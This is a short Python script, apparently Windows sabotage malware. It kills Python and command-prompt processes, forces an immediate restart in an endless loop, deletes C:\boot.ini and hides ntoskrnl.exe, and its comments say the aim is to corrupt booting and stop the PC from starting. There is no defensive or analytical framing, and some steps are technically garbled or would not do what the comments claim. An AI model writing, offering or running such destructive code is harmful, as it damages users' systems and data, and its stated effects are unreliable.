import os
import subprocess
import time

# Hide this script in the background process
os.system("taskkill  /im python.exe")
os.system("taskkill  /im cmd.exe")

while True:
    try:
        # Restart the computer
        os.system("shutdown  /r  /t 0")

        # Corrupt the boot menu
        os.system("del C:\boot.ini")

        # Prevent the PC from turning back on
        os.system("attrib +h C:\Windows\System32\drivers\ntoskrnl.exe")
    except Exception as e:
        print(f"An error occurred: {e}")
